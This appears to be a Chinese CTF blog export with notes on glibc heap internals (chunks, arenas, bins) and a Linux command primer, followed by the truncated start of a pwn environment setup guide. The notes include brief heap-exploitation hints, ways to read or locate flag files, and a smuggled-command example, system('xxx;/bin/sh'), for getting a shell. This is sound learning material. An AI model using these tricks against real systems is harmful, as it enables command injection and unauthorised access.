chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下\nfd（forward） 指向前一个（非物理相邻）空闲的 chunk\n如在fastbin中指向的是上一个被释放的chunk bk （backward）指向后一个（非物理相邻）空闲的 chunk\n通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理\nfd_nextsize， bk_nextsize # 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 一些细节 # 一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。\n当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。\n# 使用中的chunk结构 chunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | # 前一个堆未被使用时可以知道其大小 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| # 重点在P位 mem-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . # 没有fd和bk指针 . (malloc_usable_size() bytes) . next . | chunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | # 由于本chunk正在使用， +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # 所以占用了下一个chunk的prev_size位 | Size of next chunk, in bytes |A|0|1| # 下一个chunk的size位 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # 未使用的chunk结构 chunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:\u0026#39; | Size of chunk, in bytes |A|0|P| mem-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | # fd指针(指向chunk链表的前一个空闲块) +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | # bk指针 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . # 空内存，不被使用 . . # 不过值并不一定为0 next . | chunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:\u0026#39; | Size of chunk, in bytes | # 上一个chunk的大小 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| # P位 置0 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 当我们向malloc申请一片内存区域时，这块内存区域就会在内存管理器 ptmalloc 以malloc_chunk结构体来表示，而且当我们释放这个堆块时，这个堆的数据结构依然是同一个，只是表现形式不同。\nmalloc 函数返回的是一个指针，一个对应大小字节的内存块的指针。\n关于n的一些异常情况：\n当 n=0 时，返回当前系统允许的堆的最小内存块。（一般分配0x20的空间，prev_size + size + 数据对齐的0x10字节）\n当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点很重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。\n如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小\n该chunk自身的 size 字段\n下一个chunk的prev_size字段\n堆的宏观结构 # ~~复习一下，~~从总体上看可以把堆的数据结构分为微观结构和宏观结构：\n微观结构主要是malloc_chunk的数据与结构： prev_size size fd，bk fd_nextsize， bk_nextsize 宏观结构包括堆块的宏观信息，可以使我们更好地了解glibc的堆管理实现，宏观结构分为以下几个部分： arena \u0026amp; main_arena：可以看作是堆块的管理器，但其实就是堆内存本身 bin：用链表结构管理被free的malloc_chunk（堆块） top_chunk：处于一个arena的最顶部(即最高内存地址处)、不属于任何bin的一片内存 malloc_state：管理 arena 的核心结构，包含堆的状态信息、bins 链表等 main arena 对应的 malloc state 结构存储在 glibc 全局变量中 其他线程 arena 对应的 malloc_state 存储在 arena 本身中 arena \u0026amp; main_arena # 区分二者\narena 指的是堆内存区域本身，并不是结构；\n主线程的 main arena 通过 sbrk 创建，管理所有堆块的结构体\n其他线程的 arena 通过 mmap 创建，有时可能或会被不恰当地称为arena，存在于线程的控制块plt中\n不是每个线程都会有对应的arena 因为每个系统的核数有限，当线程数大于核数的二倍时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个arena 32bit \u0026ndash;\u0026gt; arena_num = 2 * core 64bit \u0026ndash;\u0026gt; arena_num = 8 * core\n主线程的 main arena和其他线程的 arena 可以看作是主分配区和非主分配区\nps：ptmalloc为什么要增加非主分配区？（问题与回答复制自： malloc内存管理总结_） 答：如果没有非主分配区，所有的线程在主分配区上操作，互相竞争锁的过程十分影响分配效率。ptmalloc中增加了非主分配区支持，主分配区和非主分配区用环形链表进行管理，提高malloc的分配效率。 申请小块内存时会产生很多内存碎片，ptmalloc在整理时也需要对分配区做加锁操作。每个加锁操作大概需要5～10个cpu指令，而且程序线程很多的情况下，锁等待的时间就会延长，导致malloc性能下降。一次加锁操作需要消耗100ns左右，正是锁的缘故，导致ptmalloc在多线程竞争情况下性能远远落后于tcmalloc。最新版的ptmalloc对锁进行了优化，加入了PER_THREAD和ATOMIC_FASTBINS优化，但默认编译不会启用该优化，这两个对锁的优化应该能够提升多线程内存的分配的效率。 如何标志\n在malloc_chunk 中的 size 的倒数第三个标志位 A，多线程时为1，主线程为0 NON_MAIN_ARENA，A：size的倒数第三位表示当前chunk属于主分配区(0)还是非主分配区(1) 子线程的堆和主线程的堆是不一样的\n每个线程都会预分配一个堆空间 线程会从这个对空间创建top_chunk和堆块 当malloc的空间超过预分配的大小，会回到main_arena之前再次分配一个空间 如果线程的堆存在溢出，可以用之前的chunk越界写堆的arena结构 一些 tips\n定位子线程的chunk的技巧 向子线程的堆块输入特殊值:\u0026ldquo;0xdeadbeef\u0026rdquo; 在gdb使用 search -4 0xdeadbeef 搜索出来的地址即堆的地址 多线程利用思路 在子线程中找到堆空间的地址空间A 在A中找到恢复线程的arena的结构 通过arena的结构尝试堆利用 malloc_state # 管理 arena 的核心结构，包含堆的状态信息、bins 链表等\nmain arena 对应的 malloc state 结构存储在 glibc 全局变量中 其他线程 arena 对应的 malloc_state 存储在 arena 本身中 Arena 头部结构：malloc_state 存储了 arena 的状态，其中的 bins[] 用于管理空闲块的 bins\nstruct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; 主要关心这么几个：\nmfastbinptr fastbinsY[NFASTBINS]，保存了 fastbins 各个链表的数组的头，大小为10 记录的是fast bin链 mchunkptr top，指向了 top chunk mchunkptr bins[NBINS * 2 - 2]，大小为129。记录的是unsorted bin（1）、small bin（2~63）、large bin链（64~126） bin # bin负责管理free的malloc_chunk，按照free的chunk大小划分为以下几种：\nfast bins，用于管理较小的 chunk small bins，用于管理中等大小的 chunk large bins，用于管理较大的 chunk unsorted bin，用于存放未整理的 chunk tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术（see commit），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。 管理流程 malloc/free \u0026ndash;\u0026gt; glibc \u0026ndash;\u0026gt; arena \u0026ndash;\u0026gt; fastbin/bins \u0026ndash;\u0026gt;smallbin/unsortedbin/largebin 从glibc找到main_arena 在main_arena的管理结构体malloc_state通过固定偏移中找到fastbinsY[NFASTBINS]，用以管理fastbin。 找到bins[NBINS * 2 - 2]，用以管理unsortedbin。 bin的放置顺序 索引为1的是unsortedbin，这里面的chunk没有进行排序，比较杂乱。 索引从2到63的bin称为small bin，同一个small bin链表中的chunk的大小相同。两个相邻索引的small bin链表中的chunk大小为2个机器字节，即32\u0026ndash;\u0026gt;4字节，64\u0026ndash;\u0026gt;8字节。 索引从64到126的bin被称为large bin。large bins中的每一个bin都包含一定范围内的chunk，其中的chunk按fd指针的顺序从大到小排列，最靠近bin头的越大，相同大小的chunk按照最近使用顺序排列。\n任意两个物理相邻的空闲chunk不能在一起，否则会合并。 free之后的chunk,与top_chunk相邻的,会与top_chunk合并，不与之相邻的,会根据其大小进入到不同的bin 小的进入fastbin，大的进入unsortedbin 此时，释放掉的chunk不会马上归还系统，ptmalloc会统一管理heap和mmap映射区域的空闲的chunk。 当用户再一次请求分配内存时，ptmalloc分配器会试图在空闲的chunk中挑选一块合适的给用户，这样可以避免频繁的系统调用，减少内存分配的开销。\n需要注意的是，并不是所有的chunk被释放之后立即放到bin中。ptmalloc为了提高分配的速度，会把一些小的堆块先放到fast bin的容器内。而且fast bin容器中的chunk的使用标记总是被置为1的，所以不会自动合并。 fastbin # 单向链表后进先出（LIFO），同时 p 位被保留（设置值为1）防止合并，同一大小的 chunk 会在同一条链上，不同大小的 chunk 在不同的链上\n不同平台大小不同，列一个索引，当 malloc 的大小在这个范围内的时候会首先去 fastbin 中找\nfastbinsY[]（下标） x86（size_t=4） x64（size_t=8） 0 0x10 0x20 1 0x18 0x30 2 0x20 0x40 3 0x28 0x50 4 0x30 0x60 5 0x38 0x70 6 0x40 0x80 注意fastbin不属于bins，不是bins管理的 fashbin是ptmalloc单独用来管理0x20-0x80（64位平台）的堆块的数据结构，如果free的chunk大小在0x20-0x80之间，会优先进入fashbin fastbin 为单向链表，只有fd指针，没有bk指针 0x602080 \u0026ndash;\u0026gt; 0x602040 \u0026ndash;\u0026gt; 0x602000 \u0026ndash;\u0026gt; 0x0 unsortedbin # 堆块中转站\n双向循环链表，先进先出（FIFO） 存放所有不满足 fastbin，未被整理的 chunk 除了fastbin管理的小堆块，free掉的chunk都是先进入到unsortedbin里再进行整理 malloc 的时候在其他 bin 没找到合适的就会遍历 unsortedbin 同时根据大小放到对应的 bin 里 在整理过程中，先将所有放在unsortedbin链上的堆块按照大小整理到其它链上 将fastbin上的碎片整理到unsorted,再由unsorted整理到其他bin链 由于使用双链表，一个bin会占用bins的两个元素。fd指向上一个chunk，bk指向下一个 smallbin # 大小在0x20-0x400（64位） 下标 x86（size_t=4） x64（size_t=8） 2 0x10 0x20 3 0x18 0x30 4 0x20 0x40 5 0x28（40） 0x50（80） x 2 * 4 * x 2 * 8 * x 63 0x1F8（504） 0x3F0（1008） 双向链表，先进先出（FIFO） 由于fast bin和small bin 有重合部分，在某些情况下会加入到small bin 释放的时候会检查相邻的是不是 free 的，如果是进行合并然后放到 unsortedbin largebin # 管理大于0x400的堆块（64位），大于0x200的堆块（32位） 双向链表，先进先出（FIFO） free时bk后面多两个此参数：fd_nextsize、bk_nextsize fd_nextsize和bk_nextsize指针用于指向第一个与自己大小不同的chunk，所以也只有在加入了大小不同的chunk时，这两个指针才会被修改 top chunk # 当我们分配一块堆内存时，top chunk是处于地址的最高处的，其前面就是我们所申请的chunk\ntop chunk的结构：\nsize：top chunk还有多少空间可以分配。 重要的是P位：0表示上一堆块处于空闲，1表示上一堆块处于使用状态。主要用于判断free时是否能与上一堆块进行合并（fastbin除外） top chunk的合并操作 如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk。 如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk 阻止top chunk合并chunk 如果在一个free掉的chunk后面再申请一个chunk，那么新申请的chunk处于使用状态，top chunk就不会合并前面的chunk。 补充：\nlast remainder chunk\nLast remainder chunk是另外一种特殊的chunk，这个特殊chunk是被维护在unsorted bin中的 在malloc时，如果有比较大的chunk可以分配，会把这个chunk分成两部分，一部分返回给用户，另一部分称为remainder，加入到 unsorted bin，last remainder会记录最近拆分的remainder。这个remainder大小至少要为MINSIZE，否则不能拆分。 当下次malloc时，如果last remainder chunk够大，则重复上一过程。 拆分的情况：fast bin 和 small bin 都没有合适的chunk，同时unsorted bin有且只有一个可拆分的chunk，并且这个chunk 是last remainder 附录 # 学习与参考链接：\n堆相关数据结构 - CTF Wiki (ctf-wiki.org)\n二进制安全之堆溢出（系列）——堆基础 \u0026amp; 结构（一）\n二进制安全之堆溢出（系列）——堆基础 \u0026amp; 结构（二）\n二进制安全之堆溢出（系列）——堆基础 \u0026amp; 结构（三）\n二进制安全之堆溢出（系列）——堆基础 \u0026amp; 结构（四）\n堆相关知识 (yuque.com)\nmalloc内存管理总结_g_malloc是怎么进行内存管理的\n（注：本文部分图片来源于unr4v31师傅的 文章）\n","date":"July 31, 2023","permalink":"/posts/pwn/heap/chunk_1/","section":"Posts","summary":"如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 堆的","title":"堆基础知识学习记录"},{"content":"","date":"July 31, 2023","permalink":"/series/%E5%A0%86%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"Series","summary":"","title":"堆学习记录"},{"content":"","date":"July 14, 2023","permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux"},{"content":"个人比较常用的Linux命令\n基础知识（入门向） # 大部分内容都是copy自 珠天PearlSky-sevenG0师傅的 文章，师傅太强啦！\n原文链接： https://mp.weixin.qq.com/s/mRPxdDJnS8boa7BNyxME3w\nLinux 常用命令 # # Linux 常用命令 # \u0026lt;------这个符号的内容后面是注释 # 下面的命令只做简单解释，不明白的可以自行百度 sudo [command] # 以系统管理员的身份执行指令，授权所执行指令的执行指令。 ls -al # 列出当前目录所有文件的详细信息 包括以 . 开头的隐藏文件 cd [path] # 切换工作目录到 path 下 . 表示当前目录 .. 表示上一级目录 / 表示根目录 pwd # 以绝对路径的方式显示用户当前工作目录 rm -rf [file] # 强制删除文件或目录 mv [file1] [file2] # 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中 cp [file1] [file2] # 用来将一个或多个源文件或者目录复制到指定的目的文件或目录 # 示例：将文件 file 复制到目录 /your/path/ 中： $ cp file /your/path/ # 使用指令 cp 将当前目录 old/dir/ 下的所有文件复制到新目录/your/new/dir 下，输入如下命令： $ cp –r old/dir/ your/new/dir less [file] # 允许用户向前或向后浏览文字档案的内容 cat [file] # 连接文件并打印到标准输出设备上 echo [string] # 打印一行文本，参数“-e”可激活转义字符 nc [ip] [port] # netcat 建立 TCP 和 UDP 连接IP地址的端口并监听 ps # 用于报告当前系统的进程状态 top # 实时查看系统的整体运行情况 kill # 杀死一个进程 ifconfig # 查看或设置网络设备 ping # 查看网络上的主机是否工作 netstat # 显示网络连接、路由表和网络接口信息 su # 切换当前用户身份到其他用户身份 touch [file] # 创建新的空文件 mkdir [dir] # 创建目录 chmod # 变更文件或目录的权限 chown # 变更某个文件或目录的所有者和所属组 uname -a # 找到对应内核版本全部信息 exit # 退出 shell man [command] # 查看Linux中的指令帮助、配置文件帮助和编程帮助等信息 apropos [whatever] # 在一些特定的包含系统命令的简短描述的数据库文件里查找关键字 | # 管道命令符 将一个命令的标准输出作为另一个命令的标准输入 var=value # 给变量var赋值value $var, ${var} # 取变量的值 `cmd`, $(cmd) # 代换标准输出 \u0026#39;string\u0026#39; # 非替换字符串 \u0026#34;string\u0026#34; # 可替换字符串 # 以下为一组命令 $ var=\u0026#34;test\u0026#34;; $ echo $var test $ echo \u0026#39;This is a $var\u0026#39;; This is a $var $ echo \u0026#34;This is a $var\u0026#34;; This is a test # end $ echo `date`; 2023年 07月 14日 星期二 23:05:19 CST $ echo $0 /bin/bash 常用快捷键 # # Bash 快捷键 Up(Down) # 上（下）一条指令 Ctrl + c # 终止当前进程 Ctrl + z # 挂起当前进程，使用“fg”可唤醒 Ctrl + d # 删除光标处的字符 Ctrl + l # 清屏 Ctrl + a # 移动到命令行首 Ctrl + e # 移动到命令行尾 Ctrl + b # 按单词后移（向左） Ctrl + f # 按单词前移（向右） Ctrl + Shift + c # 复制 Ctrl + Shift + v # 粘贴 一些根目录的知识 # /bin、/sbin：链接到 /usr/bin，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。 /boot：操作系统启动时要用到的程序。 /dev：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。 /etc：存放系统管理时要用到的各种配置文件和子目录。 /etc/rc.d：存放 Linux 启动和关闭时要用到的脚本。 /home：普通用户的主目录。 /mnt：这个目录让用户可以临时挂载其他的文件系统。 /proc：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。 /root：系统管理员的主目录。 /srv：存放一些服务启动之后需要提取的数据。 /sys：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。 /tmp：公用的临时文件存放目录。 /usr：应用程序和文件几乎都在这个目录下。 /usr/src：内核源代码的存放目录。 /var：存放了很多服务的日志信息 Linux命令执行小结 # 参考学习自lexsd6师傅的 文章，师傅太强啦！\n文章链接：\n[对linux 命令执行的总结 | lexsd6\u0026rsquo;s home]( https://lexsd6.github.io/2020/09/10/对linux 命令执行的总结/)\n读取文件命令 # cat # 由第一行开始显示内容，并将所有内容输出 cat ./flag cat /home/flag cat flag|base64 # 在当前目录输出文件内容的base64编码\t## 在getshell后如果我们实在找不到flag文件的话可以试着用find命令搜素一下 find / -name flag* find / -name *flag tac # 从最后一行倒序显示内容，并将所有内容输出 more # 根据窗口大小，一页一页的现实文件内容 # 可加-数字 一次显示的行数。+数字设置从第几行开始查看 less # 与more类似，但其优点可以往前翻页，而且进行可以搜索字符。在默认情况下翻页。 # :q 退出 echo `less ./flag` #我们还可以反引号来进行指令替代 #（以某一个指令的输出结果作为另一个指令的输入项） head # 只显示头几行。 # 可加-c 设置一次显示的字符数。-n设置从显示行数 tail # 只显示最后几行。 # 可加-c 设置一次显示的字符数。-n设置从显示行数 nl # 类似于cat -n，显示时输出行号 sort # sort 命令默认用法也有读取文件的作用 paste # 在合并文件的同时也会输出文件的内容（可以只传一个文件名） diff # diff在对比两个文件后，会将两个文件输出 od # od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来 # 我们可以通过 -a、 -c、 -ta 、-tc 选项将其转为可见字符显示出来 bzmore # bzmore将bzip压缩过的文件解压到标准输出 # 同时也可以将普通文件显示到标准输出 bzless # 增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。在默认情况下翻页。 echo `bzless ./flag`# 我们同样可以用反引号来进行指令替代 m4 # m4 将输入拷贝到输出,同时将宏展开. 宏可以是内嵌的也可以是用户定义的 curl # curl 通过文件协议来读取文件。 curl file:///home/flag 目录读取命令 # ls # ls 用于查看参数目录下的文件 dir # 与ls类似，用于查看参数目录下的文件 linux命令分割符 # 用linux命令时候,我们想用一行来执行多条命令时我们可以用命令分割符来操作。\n‘;’ 符号 # 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行.用法:\ncommand1 ; command2 # 在做pwn题目时我们可能会用到利用这个`;`的特性 # 比如执行system(\u0026#34;xxx;/bin/sh\u0026#34;)来getshell 单 ’|’ 符号 # Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推.\ncommand1 | command2 单’\u0026amp;’符号 # 默认情况下，我们命令行执行的进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’\u0026amp;’实现这个目的。用法:\ncommand1 \u0026amp; command2 #commond1 命令将会在后台进行 ‘\u0026amp;’前面的命令将会在在后端运行 另外’\u0026amp;’也是可以套娃使用的 ‘\u0026amp;’与’;’的对比 ’;’是死板的从左到右,’\u0026amp;’是将右边的放入后台执行 双’\u0026amp;’符号（’\u0026amp;\u0026amp;’） # 与c语言的’\u0026amp;\u0026amp;’类似，’\u0026amp;\u0026amp;’表时逻辑且的意思。只有在 \u0026amp;\u0026amp; 左边的命令返回真（命令返回值 $? == 0），\u0026amp;\u0026amp; 右边的命令才会被执行。用法：\ncommand1 \u0026amp;\u0026amp; command2 双’|’符号（’||’） # 与’\u0026amp;\u0026amp;’相反，’||’表示逻辑或的意思。只有在 || 左边的命令返回假，|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作\ncommand1 || command2 I / O重定向 # I / O重定向通俗的讲就是就是我们平时用到的那些就是经典的输出重定向\u0026gt;和输入重定向\u0026lt;.\n但如过要深入点了解I / O重定向，还需要了解文件描述符。\n文件描述符 # 在linux中，每个打开的文件都分配有一个文件描述符。但会保留描述符1到9。其中0、1、2是默认打开文件stdin， stdout和stderr的 文件描述符。\n0 是stdin（键盘设备文件） 又称为标准输入 ，是我们从键盘输入信息所在的文件 1 是stdout（屏幕设备文件）又称为标准输出，是linux的正常输出信息。 2 是stderr（错误消息输出到屏幕设备文件）又称为标准错误输出，是linux的错误输出信息。 如果还不理解stdout与stderr，看下下面这张图\n在cat flag1 1\u0026gt;flag2时cat flag1的标准输出未打印在屏幕上，而是重定向输出在文件flag2里。 在cat flag1 2\u0026gt;flag2时cat flag1并未报错，所以标准输出打印在屏幕上且flag2中的文件为NULL 在cat flag3 1\u0026gt;flag2时，由于没有flag3文件，所以标准输出到flag2文件里且flag2中的文件为NULL 在cat flag3 2\u0026gt;flag2时，由于没有flag3文件，cat flag3有报错但是未打印在屏幕上，而是重定向输出在文件flag2里 输入重定向 # 输入重定向是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。所以说，输入重定向主要用于改变一个命令的输入源，特别是改变那些需要大量输入的输入源。\n\u0026lt;用法： command \u0026lt; 文件 #等同于command 0\u0026lt; 文件 把文件当成输入源 \u0026lt;\u0026lt;用法： \u0026lt;\u0026lt; flag # 内容: flag 输出重定向 # 输出重定向是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件。\ncommand \u0026gt; 文件 # 相当于command 1\u0026gt;文件 command标准输出就不显示在屏幕上，而是写入到指定文件。 #这用法会覆盖文件里的内容 command \u0026gt;\u0026gt; 文件 # 相当于command 1\u0026gt;\u0026gt;文件 command标准输出就不显示在屏幕上，而是追加写入到指定文件。 #这用法不会覆盖文件里的内容 command 1\u0026gt; 文件 #command标准输出就不显示在屏幕上，而是写入到指定文件。 #这用法会覆盖文件里的内容 command 1\u0026gt;\u0026gt; 文件 #command标准输出就不显示在屏幕上，而是追加写入到指定文件。 #这用法不会覆盖文件里的内容 command 2\u0026gt; 文件 # 相当于command 2\u0026gt;文件 command报错输出就不显示在屏幕上，而是写入到指定文件。 #这用法会覆盖文件里的内容 command 2\u0026gt;\u0026gt; 文件 # 相当于command 2\u0026gt;\u0026gt;文件 command报错输出就不显示在屏幕上，而是追加写入到指定文件。 #这用法不会覆盖文件里的内容 command \u0026amp;\u0026gt; 文件 # 类似于command 1\u0026gt;文件 2\u0026gt;文件 或command 1\u0026gt;文件 2\u0026gt;1 #command标准输出与报错输出就不显示在屏幕上，而是写入到指定文件。 # 这用法不会覆盖文件里的内容 command \u0026amp;\u0026gt;\u0026gt; 文件 # 类似于command 1\u0026gt;\u0026gt;文件 2\u0026gt;\u0026gt;文件 或 command 1\u0026gt;\u0026gt;文件 2\u0026gt;\u0026gt;1 #command标准输出与报错输出就不显示在屏幕上，而是追加写入到指定文件。 # 这用法会不会覆盖文件里的内容 \u0026amp;\u0026gt; 与 \u0026gt;\u0026amp; # \u0026amp;\u0026gt;与\u0026gt;\u0026amp;都允许将标准输出（文件描述符1）和标准错误输出（文件描述符2）都重定向到的文件里.如下图所示：\n看似\u0026amp;\u0026gt;与\u0026gt;\u0026amp;一样,但如果重定向的是文件描述符时,两者这有点细微的:\n注意！在当前目录下,有个名为1的文件！！！\n我们在执行ls 1\u0026amp;\u0026gt;flag2时，\u0026amp;\u0026gt;把ls 1当成一条命令运行重定向到flag2里。\n相当于执行的是(ls 1) \u0026amp;\u0026gt;flag2。\n我们在执行ls 1\u0026gt;\u0026amp;flag2时，\u0026amp;\u0026gt;把ls当成一条命令运行重定向到sss里。\n相当于执行的是(ls) 1\u0026amp;\u0026gt;flag2。\n命令替换 # 命令替换是指将命令的标准输出作为值赋给某个变量，bash Shell定义了两种形式进行命令的替换，两种形式的语法格式如下：\n# 方式一： `Linux命令` # 方式二： $（Linux命令） 注：尽管$（）和反引号在命令替换上是等价的，但是，$（）形式的命令替换是可以嵌套的\n附录 # 本文参考链接及推荐阅读：\nCTF PWN新手入门篇 PWN学习大纲 (qq.com)\n[对linux 命令执行的总结 | lexsd6\u0026rsquo;s home]( https://lexsd6.github.io/2020/09/10/对linux 命令执行的总结/)\n","date":"July 14, 2023","permalink":"/posts/pwn/basic/linux_/","section":"Posts","summary":"个人比较常用的Linux命令 基础知识（入门向） # 大部分内容都","title":"Linux命令入门与总结"},{"content":"","date":"July 14, 2023","permalink":"/tags/ubuntu/","section":"Tags","summary":"","title":"Ubuntu"},{"content":"","date":"July 10, 2023","permalink":"/categories/blog/","section":"Categories","summary":"","title":"blog"},{"content":"","date":"July 10, 2023","permalink":"/series/my-blog/","section":"Series","summary":"","title":"my blog"},{"content":" 如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 前言 # 学习pwn已经有一段时间了，但是由于之前自己一直没有注意文件管理，也没有好的整理习惯，导致现在打pwn主用的ubuntu虚拟机的文件夹十分的混乱，虽然其实不影响目前阶段的学习和做题，但是还是想找一个契机来重装一下虚拟机。正好现在在假期时间，没有那么忙，想着重头开始搭建PWN环境，并做一下记录，一来方便以后的自己回来看，二来也可以为其他想重装ubuntu的PWN环境或者是想入门PWN的师傅提供一些参考。\n（注1：本文在部分工具安装后会补充一些基础用法，已经安装了工具的师傅们也可以看一看）\n（注2：安装的工具不全是关于PWN的，不打pwn的师傅们也可以挑着看👀）\n以下是本文所安装的工具列表，大家可以按顺序安装。\n虚拟机安装（前置条件） 基础工具 vim git gcc qemu（Kernel Pwn，刚入门的师傅可能不常用，可以跳过） python3 与 pip3 （这个要先装，之后的工具安装可能会用到pip3） gdb 及插件 peda pwndbg gef gdb-multiarch （这个可以先跳过） python PWN 相关库 pwntools LibcSearcher LibcSearcher3（可选） LibcSearcherX（可选） pwnmodules（可选） PWN 相关工具 ROPgadget one_gadget glibc-all-in_one patchelf pwn相关命令补充 seccomp-tools main_arena_offset Crypto 相关工具 gym2 sage math 优化体验的相关配置（可以在配置pwn环境之前先装好） Oh-My-Zsh （可选） terminator（可选） 其他配置 虚拟机安装 # 目前流行的虚拟机软件有VMware、Virtual Box和Virtual PC等等，也可以直接使用Windows上面自带的虚拟机，不同虚拟机软件各有优劣，我当时入门的时候是选择了VMware 16虚拟机，感觉安装起来不算很复杂。\n关于linux操作系统的选择，打pwn的师傅们一般都是使用ubuntu，版本的选择则是最新的长期支持版本 22.04（ubuntu 23并不是长期支持的版本）。虽然之前的很多题目都是在Ubuntu 20 或者18 甚至是16 的环境下，不过我们可以使用 patchelf 工具等方法来完成题目，而随着时间的推移，后面新出的pwn题都是会逐渐在较新的环境在运行，所以推荐大家直接安装最新的长期支持的版本——ubuntu 22.04：\nubuntu-22.04.2-desktop-amd64.iso\n关于虚拟机的具体安装过程，这里就不多说了，可以直接在网上搜现成的教程，网上的师傅们都写的非常详细了，这里也给大家放上一篇比较详细的教程，师傅们可以直接点击跳转：\n在VMware16虚拟机安装Ubuntu详细教程\n（因为怕有些坑大家先跳进去了，所以建议大家可以先看看后面的注意事项，大家遇到问题可以先往后翻一翻看看，也可以直接上搜索引擎搜）\n可能会遇到的问题： # 1.关于磁盘容量的问题：\n虽然很多教程都推荐最大磁盘容量为20g，但是在我的实际体验中，感觉内存还是越大越好，特别是当虚拟机里已经装了sage 